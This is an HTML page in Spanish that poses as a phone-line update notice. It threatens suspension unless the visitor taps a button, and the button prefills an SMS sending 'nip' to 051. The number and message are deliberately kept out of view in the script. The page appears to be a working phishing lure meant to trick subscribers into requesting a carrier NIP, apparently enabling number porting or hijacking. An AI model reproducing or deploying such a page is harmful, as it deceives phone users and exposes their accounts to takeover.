<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Enviar SMS</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      margin:0;
      background: #f5f5f5;
    }
    .container {
      background:#fff;
      padding:25px;
      border-radius:12px;
      box-shadow:0 5px 20px rgba(0,0,0,0.1);
      text-align:center;
      width:90%;
      max-width:380px;
    }
    .alerta {
      background:#ffdddd;
      color:#a10000;
      border:1px solid #a10000;
      padding:10px;
      border-radius:6px;
      font-size:14px;
      font-weight:bold;
      margin-bottom:20px;
    }
    h1 { font-size:20px; margin-bottom:10px; }
    p { font-size:14px; color:#555; margin-bottom:20px; }

    /* Botón formal */
    .btn {
      display:inline-block;
      padding:12px 25px;
      background:#c00000; /* Rojo elegante */
      color:#fff;
      text-decoration:none;
      font-size:16px;
      font-weight:bold;
      border-radius:6px;
      border: none;
      transition: background 0.3s, transform 0.2s;
    }
    .btn:hover { 
      background:#900000; /* Rojo más oscuro */
      transform: translateY(-2px); /* Pequeño efecto de elevación */
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }

    .warning {
      color:#b33;
      font-size:13px;
      margin-top:8px;
      display:none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="alerta">
      ⚠️ Actualiza tu línea lo antes posible, de lo contrario será suspendida.
    </div>

    <h1>Enviar NIP por SMS</h1>
    <p>Haz clic en el botón para abrir tu app de mensajes y enviar el NIP.</p>

    <a id="smsLink" class="btn" href="#">Enviar SMS</a>

    <div id="warning" class="warning">
      Es posible que el enlace no funcione en PC. Usa tu teléfono para enviar el SMS.
    </div>
  </div>

  <script>
    function isMobile() {
      return /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
    }
    function isIOS() {
      return /iPhone|iPad|iPod/i.test(navigator.userAgent);
    }

    const link = document.getElementById('smsLink');

    // Número y mensaje solo en el código, no visible en la página
    const numero = "051";
    const mensaje = "nip";

    if (!isMobile()) {
      document.getElementById('warning').style.display = 'block';
    } else {
      if (isIOS()) {
        link.href = `sms:${numero}&body=${mensaje}`; // formato para iPhone
      } else {
        link.href = `sms:${numero}?body=${mensaje}`; // formato para Android
      }
    }
  </script>
</body>
</html>
